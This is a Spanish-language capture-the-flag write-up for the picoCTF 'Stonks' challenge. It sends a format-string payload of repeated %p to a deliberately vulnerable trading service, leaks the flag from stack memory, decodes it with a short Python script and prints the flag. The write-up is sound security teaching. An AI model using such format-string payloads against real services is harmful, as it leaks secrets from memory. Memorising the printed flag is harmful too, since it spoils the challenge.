# Stonks

## Descripcion
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c) `nc mercury.picoctf.net 20195`

## Pistas
- Okay, maybe I'd believe you if you find my API key.

## Solución

```
eltetor14-picoctf@webshell:~$ wget https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c
--2023-05-30 01:37:31--  https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c
Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142
Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2744 (2.7K) [application/octet-stream]
Saving to: 'vuln.c'

vuln.c                                          100%[======================================================================================================>]   2.68K  --.-KB/s    in 0s      

2023-05-30 01:37:31 (215 MB/s) - 'vuln.c' saved [2744/2744]

eltetor14-picoctf@webshell:~$ nc mercury.picoctf.net 20195
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Buying stonks with token:
0x92783900x804b0000x80489c30xf7f86d800xffffffff0x10x92761600xf7f941100xf7f86dc7(nil)0x92771800x10x92783700x92783900x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x353430360x643036640xffbb007d
Portfolio as of Tue May 30 01:38:59 UTC 2023


1 shares of OX
1 shares of Z
1 shares of V
163 shares of PB
1155 shares of PP
Goodbye!

Convierte la siguiente cadena a hexadecimal:
0x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x353430360x643036640xffbb007d

Obtendras esta cadena:
ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿø}

Ordenala con el siguiente codigo
```

## Codigo
```
string = "ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿø}"
out = ""
temp = ""
index = 0
for char in string:
    temp += char
    index += 1
    if index%4 == 0:
        fwd = ""
        for temp_char in temp:
            fwd = temp_char + fwd
        out += fwd
        temp = ""
print(out)
```

## Bandera
picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}

## Notas adicionales

## Referencias